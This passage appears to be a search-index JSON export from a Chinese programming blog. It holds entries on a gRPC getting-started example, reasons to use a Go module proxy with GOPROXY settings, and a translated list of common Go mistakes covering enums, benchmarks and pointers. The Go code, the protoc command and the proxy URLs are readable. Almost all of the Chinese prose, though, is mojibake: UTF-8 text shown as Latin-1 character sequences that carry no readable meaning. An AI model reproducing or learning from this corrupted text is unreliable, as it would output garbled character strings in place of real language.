æœåŠ¡ã€æœåŠ¡ä¸‹çš„æ–¹æ³•ã€è¯·æ±‚å’Œå“åº”çš„æ•°æ®æ ¼å¼ï¼Œè€Œ RPC æœåŠ¡çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åˆ™å°†æ ¹æ®è¿™ä¸ªåè®®è¿›è¡Œç›¸äº’ã€‚ ä¸‹é¢å°†ä¼šæ„å»º RPC æœåŠ¡ç«¯å“åº”æ•°æ®ï¼Œä»¥åŠ RPC å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ã€‚ ","date":"2019-08-23","objectID":"/grpc/:1:0","tags":["Golang"],"title":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","uri":"/grpc/"},{"categories":["Golang"],"content":"Node.js ç‰ˆæœ¬ åœ¨ Node.js ä¸­ä½¿ç”¨ gRPC éå¸¸ç®€å•ï¼Œæˆ‘ä»¬éœ€è¦ä¾èµ– grpc å’Œ @grpc/proto-loader è¿™ä¸¤ä¸ªå®˜æ–¹åŒ…ã€‚ 1ã€æ„å»º gRPC æœåŠ¡ç«¯ï¼š å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬éœ€è¦å¯¼å…¥å‰é¢å®šä¹‰å¥½çš„ .proto æ–‡ä»¶ï¼ŒåŒæ—¶ç”±äºè¯­è¨€æœ¬èº«æ•°æ®ç±»å‹çš„ä¸åŒï¼Œå¯ä»¥è®¾ç½®ç±»å‹è½¬æ¢ï¼Œæ¯”å¦‚å°† .proto ä¸­å®šä¹‰çš„æšä¸¾ç±»å‹è½¬æ¢ä¸º node.js ä¸­çš„ string ç±»å‹ã€‚ gRPC æœåŠ¡ç«¯éœ€è¦æŒ‰ç…§ .proto çš„çº¦å®šï¼Œç»‘å®šæœåŠ¡ä»¥åŠå®ç°å…·ä½“çš„æ–¹æ³•ï¼ŒåŒæ—¶ç”±äºå…¶åº•å±‚åŸºäº HTTP/2 åè®®é€šä¿¡ï¼Œå› æ­¤è¿˜éœ€è¦ç›‘å¬ä¸€ä¸ªå…·ä½“çš„ç«¯å£å¹¶ä¸”å¯åŠ¨è¿™ä¸ª gRPC æœåŠ¡ã€‚ 2ã€æ„å»º gRPC å®¢æˆ·ç«¯å‘èµ· RPC è°ƒç”¨ï¼š # --proto_path æºè·¯å¾„ï¼Œ --go_out è¾“å‡ºè·¯å¾„ï¼Œä¸€å®šè¦æŒ‡æ˜ plugins=grpc protoc --proto_path=grpc --go_out=plugins=grpc:grpc test.proto éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŒ…åã€æœåŠ¡åã€æ–¹æ³•åå¿…é¡»å’Œ .proto æ–‡ä»¶å®šä¹‰çš„ä¿æŒä¸€è‡´ã€‚ ","date":"2019-08-23","objectID":"/grpc/:2:0","tags":["Golang"],"title":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","uri":"/grpc/"},{"categories":["Golang"],"content":"Go ç‰ˆæœ¬ ä¸ Node.js ä¸åŒçš„æ˜¯ Go æ˜¯ä¸€ä¸ªé™æ€è¯­è¨€ï¼Œéœ€è¦å…ˆç¼–è¯‘æ‰èƒ½è¿è¡Œï¼Œå› æ­¤ä½¿ç”¨ gRPC æœ‰ä¸€ç‚¹ä¸åŒï¼Œæˆ‘ä»¬å…ˆè¦å»å®˜ç½‘ https://github.com/protocolbuffers/protobuf/releases ä¸‹è½½å¹¶å®‰è£… protocï¼ˆ protocol buffers ç¼–è¯‘å™¨ï¼‰ã€‚ 1ã€æ‰§è¡Œ protoc æŒ‡ä»¤ï¼š ç¼–è¯‘ .proto æ–‡ä»¶ç”Ÿæˆ .pb.go ä»£ç åŒ…ï¼Œåœ¨åç»­çš„ä½¿ç”¨ä¸­éœ€è¦å¯¼å…¥è¿™ä¸ªä»£ç åŒ…ã€‚ 2ã€æ„é€  gRPC æœåŠ¡ç«¯ï¼š 3ã€æ„å»º gRPC å®¢æˆ·ç«¯å‘èµ· RPC è°ƒç”¨ï¼š protoc ç¼–è¯‘ .proto æ–‡ä»¶ç”Ÿæˆçš„ .pb.go ä»£ç åŒ…é‡Œé¢åŒ…å«äº†æ‰€æœ‰çš„æœåŠ¡ã€æ–¹æ³•ã€æ•°æ®ç»“æ„ç­‰ç­‰ï¼Œåœ¨æˆ‘ä»¬çš„ go ä»£ç ä¸­å¼•ç”¨å®ƒä»¬å³å¯ã€‚ ","date":"2019-08-23","objectID":"/grpc/:3:0","tags":["Golang"],"title":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","uri":"/grpc/"},{"categories":["Golang"],"content":"ç»“è¯­ ä¸è®ºæ˜¯ gRPC çš„å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯å¹¶æ²¡æœ‰é™åˆ¶å…·ä½“çš„è¯­è¨€ï¼Œè¿™æ„å‘³ç€ä½ å®Œå…¨å¯ä»¥ä½¿ç”¨ node.js å®¢æˆ·ç«¯å»è°ƒç”¨ go æœåŠ¡ç«¯ï¼Œæˆ–è€…å…¶å®ƒä»»æ„è¯­è¨€çš„ç»„åˆã€‚ ä½†æ˜¯ gRPC å®˜æ–¹å½“å‰æ”¯æŒçš„è¯­è¨€æ˜¯æœ‰é™çš„ï¼Œåªæœ‰ Androidã€C#ã€C++ã€Dartã€Goã€Javaã€Nodeã€PHPã€Pythonã€Rubyã€Webï¼ˆ js + envoy ï¼‰ã€‚ å…¶æ¬¡ï¼ŒgRPC å¹¶ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œæ¯”å¦‚å¤§æ•°æ®é›†ï¼ˆå•æ¡æ¶ˆæ¯è¶…è¿‡ 1 MB ï¼‰å°±ä¸é€‚åˆç”¨ gRPC ï¼Œå³ä½¿ä½ å¯ä»¥é€šè¿‡åˆ†å—æµå¼çš„æ–¹æ³•æ¥å®ç°ï¼Œä½†æ˜¯å¤æ‚åº¦ä¼šæˆå€çš„å¢åŠ ã€‚ ","date":"2019-08-23","objectID":"/grpc/:4:0","tags":["Golang"],"title":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","uri":"/grpc/"},{"categories":["Golang"],"content":"å‚è€ƒèµ„æ–™ https://developers.google.com/protocol-buffers/docs/overview https://www.grpc.io/docs/guides https://github.com/grpc/grpc-node https://github.com/grpc/grpc-go ","date":"2019-08-23","objectID":"/grpc/:5:0","tags":["Golang"],"title":"å¾®æœåŠ¡äº’é€šçš„æ¡¥æ¢: gRPC å…¥é—¨ç¤ºä¾‹","uri":"/grpc/"},{"categories":["Golang"],"content":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","date":"2019-08-12","objectID":"/why-use-go-module-proxy/","tags":["Golang"],"title":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","uri":"/why-use-go-module-proxy/"},{"categories":["Golang"],"content":"è‡ªä» Go v1.11 ç‰ˆæœ¬ä¹‹å Go modules æˆäº†å®˜æ–¹çš„åŒ…ç®¡ç†æ–¹å¼ï¼Œä¸æ­¤åŒæ—¶è¿˜æœ‰ä¸€ä¸ª Go module proxy ï¼Œå®ƒåˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Ÿé¡¾åæ€ä¹‰ï¼Œå…¶å®å°±æ˜¯ä¸ªä»£ç†ï¼Œæ‰€æœ‰çš„æ¨¡å—å’Œä¾èµ–åº“éƒ½å¯ä»¥ä»è¿™ä¸ªä»£ç†ä¸Šä¸‹è½½ã€‚ Go module proxy åˆ°åº•æœ‰ä½•ç‰¹åˆ«ä¹‹å¤„ï¼Ÿæˆ‘ä»¬ä¸ºä»€ä¹ˆåº”è¯¥ä½¿ç”¨å®ƒï¼Ÿ ä½¿ç”¨ Go modules ï¼Œå¦‚æœä½ æ·»åŠ äº†æ–°çš„ä¾èµ–é¡¹æˆ–è€…æ„å»ºäº†è‡ªå·±çš„æ¨¡å—ï¼Œé‚£ä¹ˆå®ƒå°†ä¼šåŸºäº go.mod æ–‡ä»¶ä¸‹è½½ï¼ˆ go get ï¼‰æ‰€æœ‰çš„ä¾èµ–é¡¹å¹¶ä¸”ç¼“å­˜èµ·æ¥ã€‚ä½ å¯ä»¥ä½¿ç”¨ vendor ç›®å½•ï¼ˆå°†ä¾èµ–é¡¹ç½®äºæ­¤ç›®å½•ä¸‹ï¼‰ä»¥ç»•è¿‡ç¼“å­˜ï¼ŒåŒæ—¶é€šè¿‡ -mod=vendor æ ‡è®°å°±å¯ä»¥æŒ‡å®šä½¿ç”¨ vendor ç›®å½•ä¸‹çš„ä¾èµ–é¡¹è¿›è¡Œæ„å»ºã€‚ç„¶è€Œè¿™ä¹ˆåšå¹¶ä¸å¥½ã€‚ ","date":"2019-08-12","objectID":"/why-use-go-module-proxy/:0:0","tags":["Golang"],"title":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","uri":"/why-use-go-module-proxy/"},{"categories":["Golang"],"content":"01 ä½¿ç”¨ vendor ç›®å½•æœ‰å“ªäº›é—®é¢˜ï¼š vendor ç›®å½•ä¸å†æ˜¯ go å‘½ä»¤çš„é»˜è®¤é¡¹ï¼Œä½ å¿…é¡»é€šè¿‡ -mode=vendor æŒ‡å®šã€‚ vendor ç›®å½•å ç”¨äº†å¤ªå¤šçš„ç©ºé—´ï¼Œå…‹éš†æ—¶ä¹Ÿä¼šèŠ±è´¹å¤§é‡æ—¶é—´ï¼Œå°¤å…¶æ˜¯ CI/CD çš„æ•ˆç‡å¾ˆä½ã€‚ vendor æ›´æ–°ä¾èµ–é¡¹å¾ˆéš¾ review ï¼Œè€Œä¾èµ–é¡¹åˆå¸¸å¸¸ä¸ä¸šåŠ¡é€»è¾‘ç´§å¯†å…³è”ï¼Œæˆ‘ä»¬å¾ˆéš¾å»å›é¡¾åˆ°åº•å‘ç”Ÿäº†å“ªäº›å˜åŒ–ã€‚ é‚£ä¹ˆä¸ä½¿ç”¨ vendor ç›®å½•åˆä¼šå¦‚ä½•å‘¢ï¼Ÿè¿™æ—¶æˆ‘ä»¬åˆå°†é¢ä¸´å¦‚ä¸‹é—®é¢˜ï¼š go å°†å°è¯•ä»æºåº“ä¸‹è½½ä¾èµ–é¡¹ï¼Œä½†æ˜¯æºåº“å­˜åœ¨è¢«åˆ é™¤çš„é£é™©ã€‚ VCSï¼ˆç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå¦‚ github.comï¼‰å¯èƒ½ä¼šæŒ‚æ‰æˆ–æ— æ³•ä½¿ç”¨ï¼Œè¿™æ—¶ä½ ä¹Ÿæ— æ³•æ„å»ºä½ çš„é¡¹ç›®ã€‚ æœ‰äº›å…¬å¸çš„å†…éƒ¨ç½‘ç»œå¯¹å¤–éš”ç¦»ï¼Œä¸ä½¿ç”¨ vendor ç›®å½•å¯¹ä»–ä»¬æ¥è¯´ä¹Ÿä¸è¡Œã€‚ ä¾èµ–åº“çš„æ‰€æœ‰è€…å¯èƒ½é€šè¿‡æ¨é€ç›¸åŒç‰ˆæœ¬çš„æ¶æ„å†…å®¹è¿›è¡Œç ´åã€‚è¦é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œéœ€è¦å°† go.sum å’Œ go.mod æ–‡ä»¶ä¸€èµ·å­˜å‚¨ã€‚ æŸäº›ä¾èµ–é¡¹å¯èƒ½ä¼šä½¿ç”¨ä¸ git ä¸åŒçš„ VCS ï¼Œå¦‚ hgï¼ˆMercurialï¼‰ã€bzrï¼ˆBazaarï¼‰ã€svnï¼ˆSubversionï¼‰ï¼Œå› æ­¤ä½ ä¸å¾—ä¸å®‰è£…è¿™äº›å…¶ä»–çš„å·¥å…·ï¼Œå¾ˆçƒ¦ã€‚ go get éœ€è¦è·å– go.mod ä¸­æ¯ä¸ªä¾èµ–é¡¹çš„æºä»£ç ä»¥è§£å†³ä¼ é€’ä¾èµ–ï¼Œè¿™æ˜¾è‘—å‡æ…¢äº†æ•´ä¸ªæ„å»ºè¿‡ç¨‹ï¼Œå› ä¸ºå®ƒå¿…é¡»ä¸‹è½½ï¼ˆgit cloneï¼‰æ¯ä¸ªå­˜å‚¨åº“ä»¥è·å–å•ä¸ªæ–‡ä»¶ã€‚ å¦‚ä½•è§£å†³ä¸Šè¿°è¿™ä¸€ç³»åˆ—çš„é—®é¢˜ï¼Ÿç­”æ¡ˆæ˜¯ä½¿ç”¨ Go module proxy ã€‚ ","date":"2019-08-12","objectID":"/why-use-go-module-proxy/:1:0","tags":["Golang"],"title":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","uri":"/why-use-go-module-proxy/"},{"categories":["Golang"],"content":"02 é»˜è®¤æƒ…å†µä¸‹ï¼Œgo å‘½ä»¤ç›´æ¥ä» VCS ä¸‹è½½æ¨¡å—ã€‚ç¯å¢ƒå˜é‡ GOPROXY æŒ‡å®šä½¿ç”¨ Go module proxy ä»¥è¿›ä¸€æ­¥æ§åˆ¶ä¸‹è½½æºã€‚ é€šè¿‡è®¾ç½® GOPROXY ï¼Œä½ å°†ä¼šè§£å†³ä¸Šè¿°çš„æ‰€æœ‰é—®é¢˜ï¼š Go module proxy é»˜è®¤ç¼“å­˜å¹¶æ°¸ä¹…å­˜å‚¨æ‰€æœ‰ä¾èµ–é¡¹ï¼ˆä¸å¯å˜å­˜å‚¨ï¼‰ï¼Œä½ ä¸å†éœ€è¦ vendor ç›®å½•ã€‚ æ‘†è„±äº† vendor ç›®å½•æ„å‘³ç€é¡¹ç›®ä¸å†å ç”¨ repository ç©ºé—´ï¼Œæé«˜äº†æ•ˆç‡ã€‚ ç”±äºä¾èµ–åº“ä»¥ä¸å¯å˜çš„å½¢å¼å­˜å‚¨åœ¨ä»£ç†ä¸­ï¼Œå³ä½¿æºåº“åˆ é™¤ï¼Œä»£ç†ä¸­çš„åº“ä¹Ÿä¸ä¼šè¢«åˆ é™¤ï¼Œè¿™ä¿éšœä¾èµ–åº“çš„ä½¿ç”¨è€…ã€‚ ä¸€æ—¦æ¨¡å—è¢«å­˜å‚¨åœ¨ Go proxy ä¸­ï¼Œå°±æ— æ³•è¢«è¦†ç›–æˆ–è€…åˆ é™¤ï¼Œæ¢å¥è¯è¯´ä½¿ç”¨ç›¸åŒç‰ˆæœ¬æ³¨å…¥æ¶æ„ä»£ç çš„è¡Œä¸ºæ”»å‡»å°†ä¸å†å¥æ•ˆã€‚ ä½ ä¸å†éœ€è¦ä»»ä½• VCS å·¥å…·æ¥ä¸‹è½½ä¾èµ–é¡¹ï¼Œå› ä¸ºä½ åªéœ€è¦é€šè¿‡ http ä¸ Go proxy å»ºç«‹è¿æ¥ã€‚ ä¸‹è½½å’Œæ„å»ºå°†ä¼šå¿«å¾ˆå¤šï¼Œå®˜æ–¹å›¢é˜Ÿæµ‹è¯•çš„ç»“æœæ˜¯å¿«äº†ä¸‰åˆ°å…­å€ã€‚ ä½ å¯ä»¥è½»æ¾ç®¡ç†è‡ªå·±çš„ä»£ç†ï¼Œè¿™å¯ä»¥è®©ä½ æ›´å¥½çš„æ§åˆ¶æ„å»ºç®¡é“çš„ç¨³å®šæ€§ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œä½ ç»å¯¹åº”è¯¥ä½¿ç”¨ Go module proxy ã€‚ ","date":"2019-08-12","objectID":"/why-use-go-module-proxy/:2:0","tags":["Golang"],"title":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","uri":"/why-use-go-module-proxy/"},{"categories":["Golang"],"content":"03 å¦‚ä½•ä½¿ç”¨ Go module proxy ï¼Ÿ ä½ éœ€è¦è®¾ç½®ç¯å¢ƒå˜é‡ GOPROXY ï¼š 1ã€å¦‚æœ GOPROXY æœªè®¾ç½®ã€ä¸ºç©ºã€æˆ–è€…è®¾ç½®ä¸º direct ï¼Œåˆ™ go get å°†ç›´è¿ VCS ï¼ˆå¦‚ github.comï¼‰ï¼š GOPROXY=\"\" GOPROXY=direct å¦‚æœè®¾ç½®ä¸º off ï¼Œåˆ™è¡¨ç¤ºä¸å…è®¸ä½¿ç”¨ç½‘ç»œï¼š GOPROXY=off 2ã€ä½ å¯ä»¥ä½¿ç”¨ä»»æ„ä¸€ä¸ªå…¬å…±çš„ä»£ç† : GOPROXY=https://proxy.golang.org # è°·æ­Œå®˜æ–¹ï¼Œå¤§é™†åœ°åŒºè¢«å¢™äº† GOPROXY=https://goproxy.io # ä¸ªäººå¼€æº GOPROXY=https://goproxy.cn # å¤§é™†åœ°åŒºå»ºè®®ä½¿ç”¨ï¼Œä¸ƒç‰›äº‘æ‰˜ç®¡ 3ã€ä½ å¯ä»¥åŸºäºå¼€æºæ–¹æ¡ˆå®ç°æœ¬åœ°éƒ¨ç½²ï¼š Athens: https://github.com/gomods/athens goproxy: https://github.com/goproxy/goproxy THUMBAI: https://thumbai.app/ é€šè¿‡è¿™ç§æ–¹å¼ä½ å¯ä»¥æ„å»ºä¸€ä¸ªå…¬å¸çš„å†…éƒ¨ä»£ç†ï¼Œä¸å¤–ç½‘éš”ç¦»ã€‚ 4ã€ä½ å¯ä»¥è´­ä¹°å•†ä¸šäº§å“ï¼š Artifactory: https://jfrog.com/artifactory/ 5ã€ä½ å¯ä»¥ä½¿ç”¨ file:/// URL ï¼Œæ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨çš„ã€‚ ","date":"2019-08-12","objectID":"/why-use-go-module-proxy/:3:0","tags":["Golang"],"title":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","uri":"/why-use-go-module-proxy/"},{"categories":["Golang"],"content":"04 Go v1.13 ç‰ˆæœ¬çš„ç›¸å…³æ›´æ”¹ï¼š GOPROXY å¯ä»¥è®¾ç½®ä¸ºä»¥é€—å·åˆ†éš”çš„åˆ—è¡¨ï¼Œå¦‚æœæŸä¸ªåœ°å€å¤±è´¥å°†ä¼šä¾æ¬¡å°è¯•åé¢çš„åœ°å€ã€‚ GOPROXY é»˜è®¤å¯åŠ¨ï¼Œé»˜è®¤å€¼å°†ä¼šæ˜¯ https://proxy.golang.org,direct ã€‚direct ä¹‹åçš„åœ°å€å°†ä¼šè¢«å¿½ç•¥ã€‚ GOPRIVATE ç¯å¢ƒå˜é‡å°†ä¼šè¢«æ¨å‡ºï¼Œç”¨äºç»•è¿‡ GOPROXY ä¸­çš„ç‰¹å®šè·¯å¾„ï¼Œå°¤å…¶æ˜¯å…¬å¸ä¸­çš„ç§æœ‰æ¨¡å—ã€‚ ","date":"2019-08-12","objectID":"/why-use-go-module-proxy/:4:0","tags":["Golang"],"title":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","uri":"/why-use-go-module-proxy/"},{"categories":["Golang"],"content":"å‚è€ƒèµ„æ–™ https://github.com/golang/go/wiki/Modules https://proxy.golang.org/ ","date":"2019-08-12","objectID":"/why-use-go-module-proxy/:5:0","tags":["Golang"],"title":"ä¸ºä»€ä¹ˆä½ åº”è¯¥ä½¿ç”¨ Go module proxy","uri":"/why-use-go-module-proxy/"},{"categories":["Golang"],"content":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","date":"2019-07-29","objectID":"/top-10-mistakes/","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"æ–‡æœ¬ç¿»è¯‘è‡ª: https://itnext.io/the-top-10-most-common-mistakes-ive-seen-in-go-projects-4b79d4f6cd65 æœ¬æ–‡å°†ä¼šä»‹ç» Go å¼€å‘ä¸­åç§æœ€å¸¸çŠ¯çš„é”™è¯¯ï¼Œå†…å®¹ä¸ç®—å°‘ï¼Œè¯·è€å¿ƒè§‚çœ‹ã€‚ ","date":"2019-07-29","objectID":"/top-10-mistakes/:0:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"1ã€æœªçŸ¥çš„æšä¸¾å€¼ ç¤ºä¾‹ï¼š type Status uint32 const ( StatusOpen Status = iota StatusClosed StatusUnknown ) ç¤ºä¾‹ä¸­ä½¿ç”¨äº† iota åˆ›å»ºäº†æšä¸¾å€¼ï¼Œå…¶ç»“æœå°±æ˜¯ï¼š StatusOpen = 0 StatusClosed = 1 StatusUnknown = 2 ç°åœ¨å‡è®¾ä¸Šè¿° Status ç±»å‹å°†ä¼šä½œä¸º JSON request çš„ä¸€éƒ¨åˆ†ï¼š type Request struct { ID int `json:\"Id\"` Timestamp int `json:\"Timestamp\"` Status Status `json:\"Status\"` } ç„¶åä½ æ”¶åˆ°çš„æ•°æ®å¯èƒ½æ˜¯ï¼š { \"Id\": 1234, \"Timestamp\": 1563362390, \"Status\": 0 } è¿™çœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œstatus å°†ä¼šè¢«è§£ç ä¸º StatusOpen ã€‚ ä½†æ˜¯å¦‚æœå¦ä¸€ä¸ªè¯·æ±‚çš„æ•°æ®æ˜¯è¿™æ ·ï¼š { \"Id\": 1235, \"Timestamp\": 1563362390 } è¿™æ—¶ status å³ä½¿æ²¡æœ‰ä¼ å€¼ï¼ˆä¹Ÿå°±æ˜¯ unknown æœªçŸ¥çŠ¶æ€ï¼‰ï¼Œä½†ç”±äºé»˜è®¤é›¶å€¼ï¼Œå…¶å°†ä¼šè¢«è§£ç ä¸º StatusOpen ï¼Œæ˜¾ç„¶ä¸ç¬¦åˆä¸šåŠ¡è¯­ä¹‰ä¸Šçš„ StatusUnknown ã€‚ æœ€ä½³å®è·µæ˜¯å°†æœªçŸ¥çš„æšä¸¾å€¼è®¾ç½®ä¸º 0 ï¼š type Status uint32 const ( StatusUnknown Status = iota StatusOpen StatusClosed ) ","date":"2019-07-29","objectID":"/top-10-mistakes/:1:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"2ã€åŸºå‡†æµ‹è¯• åŸºå‡†æµ‹è¯•å—åˆ°å¤šæ–¹é¢çš„å½±å“ï¼Œå› æ­¤æƒ³å¾—åˆ°æ­£ç¡®çš„ç»“æœæ¯”è¾ƒå›°éš¾ã€‚ æœ€å¸¸è§çš„ä¸€ç§é”™è¯¯æƒ…å†µå°±æ˜¯è¢«ç¼–è¯‘å™¨ä¼˜åŒ–äº†ï¼Œä¾‹å¦‚ï¼š func clear(n uint64, i, j uint8) uint64 { return (math.MaxUint64\u003c\u003cj | ((1 \u003c\u003c i) - 1)) \u0026 n } è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ¸…é™¤æŒ‡å®šèŒƒå›´çš„ bit ä½ï¼ŒåŸºå‡†æµ‹è¯•å¯èƒ½ä¼šè¿™æ ·å†™ï¼š func BenchmarkWrong(b *testing.B) { for i := 0; i \u003c b.N; i++ { clear(1221892080809121, 10, 63) } } åœ¨è¿™ä¸ªåŸºå‡†æµ‹è¯•ä¸­ï¼Œç¼–è¯‘å™¨å°†ä¼šæ³¨æ„åˆ°è¿™ä¸ª clear æ˜¯ä¸€ä¸ª leaf å‡½æ•°ï¼ˆæ²¡æœ‰è°ƒç”¨å…¶å®ƒå‡½æ•°ï¼‰å› æ­¤ä¼šå°†å…¶ inline ã€‚ä¸€æ—¦è¿™ä¸ªå‡½æ•°è¢« inline äº†ï¼Œç¼–è¯‘å™¨ä¹Ÿä¼šæ³¨æ„åˆ°å®ƒæ²¡æœ‰ side-effectsï¼ˆå‰¯ä½œç”¨ï¼‰ã€‚å› æ­¤ clear å‡½æ•°çš„è°ƒç”¨å°†ä¼šè¢«ç®€å•çš„ç§»é™¤ä»è€Œå¯¼è‡´ä¸å‡†ç¡®çš„ç»“æœã€‚ è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ç§æ–¹å¼æ˜¯å°†å‡½æ•°çš„è¿”å›ç»“æœè®¾ç½®ç»™ä¸€ä¸ªå…¨å±€å˜é‡ï¼š var result uint64 func BenchmarkCorrect(b *testing.B) { var r uint64 for i := 0; i \u003c b.N; i++ { r = clear(1221892080809121, 10, 63) } result = r } æ­¤æ—¶ï¼Œç¼–è¯‘å™¨ä¸çŸ¥é“è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨æ˜¯å¦ä¼šäº§ç”Ÿ side-effect ï¼Œå› æ­¤åŸºå‡†æµ‹è¯•çš„ç»“æœå°†ä¼šæ˜¯å‡†ç¡®çš„ã€‚ ","date":"2019-07-29","objectID":"/top-10-mistakes/:2:0","tags":["Golang"],"title":"Go å¼€å‘åç§å¸¸çŠ¯é”™è¯¯ã€è¯‘ã€‘","uri":"/top-10-mistakes/"},{"categories":["Golang"],"content":"3ã€æŒ‡é’ˆ æŒ‰å€¼ä¼ é€’å˜é‡å°†ä¼šåˆ›å»ºæ­¤å˜é‡çš„å‰¯æœ¬ï¼ˆç®€ç§°â€œå€¼æ‹·è´â€ï¼‰ï¼Œè€Œé€šè¿‡æŒ‡é’ˆä¼ é€’åˆ™åªä¼šå¤åˆ¶å˜é‡çš„å†…å­˜åœ°å€ã€‚ å› æ­¤ï¼ŒæŒ‡é’ˆä¼ é€’æ€»æ˜¯æ›´å¿«å—ï¼Ÿæ˜¾ç„¶ä¸æ˜¯ï¼Œå°¤å…¶æ˜¯å¯¹äºå°æ•°æ®è€Œè¨€ï¼Œå€¼æ‹·è´æ›´å¿«æ€§èƒ½æ›´å¥½ã€‚ åŸå› ä¸ Go ä¸­çš„å†…å­˜ç®¡ç†æœ‰å…³ã€‚è®©æˆ‘ä»¬ç®€å•çš„è§£é‡Šä¸€ä¸‹ã€‚ å˜é‡å¯ä»¥è¢«åˆ†é…åˆ° heap æˆ–è€… stack ä¸­ï¼š stack åŒ…å«äº†æŒ‡å®š goroutine ä¸­çš„å°†ä¼šè¢«ç”¨åˆ°çš„å˜é‡ã€‚ä¸€æ—¦å‡½æ•°è¿”å›ï¼Œå˜é‡å°†ä¼šä» stack ä¸­ pop ç§»é™¤ã€‚ heap åŒ…å«äº†éœ€è¦å…±äº«çš„å˜é‡ï¼ˆä¾‹å¦‚å…¨å±€å˜é‡ç­‰ï¼‰ã€‚ ç¤ºä¾‹ï¼š func getFooValue() foo { var result foo // Do something return result } è¿™é‡Œï¼Œresult å˜é‡ç”±å½“å‰çš„ goroutine åˆ›å»ºï¼Œå¹¶ä¸”å°†ä¼šè¢« push åˆ°å½“å‰çš„ stack ä¸­ã€‚ä¸€æ—¦è¿™ä¸ªå‡½æ•°è¿”å›äº†ï¼Œè°ƒç”¨è€…å°†ä¼šæ”¶åˆ° result å˜é‡çš„å€¼æ‹·è´å‰¯æœ¬ï¼Œè€Œè¿™ä¸ª result å˜é‡æœ¬èº«å°†ä¼šè¢«ä» stack ä¸­ pop ç§»é™¤æ‰ã€‚å®ƒä»å­˜åœ¨äºå†…å­˜ä¸­ï¼Œç›´åˆ°å®ƒè¢«å¦ä¸€ä¸ªå˜é‡æ“¦é™¤ï¼Œä½†æ˜¯å®ƒæ— æ³•è¢«è®¿é—®åˆ°ã€‚ ç°åœ¨çœ‹ä¸‹æŒ‡é’ˆçš„ç¤ºä¾‹ï¼š func getFooPointer() *foo { var result foo // Do something return \u0026result } result å˜é‡ä»ç„¶ç”±å½“å‰ goroutine åˆ›å»ºï¼Œä½†æ˜¯å‡½æ•°çš„è°ƒç”¨è€…å°†ä¼šæ¥å—çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ˆresult å˜é‡å†…å­˜åœ°å€çš„å‰¯æœ¬ï¼‰ã€‚å¦‚æœ result å˜é‡è¢«ä» stack ä¸­ pop ç§»é™¤ï¼Œé‚£ä¹ˆå‡½æ•°è°ƒç”¨è€…æ˜¾ç„¶æ— æ³•å†è®¿é—®å®ƒã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ºäº†æ­£å¸¸ä½¿ç”¨ result å˜é‡ï¼ŒGo ç¼–è¯‘å™¨å°†ä¼šæŠŠ result å˜é‡ escapeï¼ˆè½¬ç§»ï¼‰åˆ°ä¸€ä¸ªå¯ä»¥å…±äº«å˜é‡çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ heap ä¸­ã€‚ ä¼ é€’æŒ‡é’ˆä¹Ÿä¼šæœ‰å¦ä¸€ç§æƒ…å†µï¼Œä¾‹å¦‚ï¼š func main() { p := \u0026foo{} f(p) } ç”±äºæˆ‘ä»¬åœ¨ç›¸åŒçš„ goroutineï¼ˆmain å‡½æ•°ï¼‰ä¸­è°ƒç”¨ f å‡½æ•°ï¼Œè¿™é‡Œçš„ p å˜é‡æ— éœ€è¢« escape åˆ° heap ä¸­ï¼Œå®ƒåªä¼šè¢«æ¨é€åˆ° stack ä¸­ï¼Œå¹¶ä¸” sub-function ä¹Ÿå°±æ˜¯è¿™é‡Œçš„ f å‡½æ•°æ˜¯å¯ä»¥ç›´æ¥è®¿é—®åˆ° p å˜é‡çš„ã€‚ stack ä¸ºä»€ä¹ˆæ›´å¿«ï¼Ÿä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼š stack å‡ 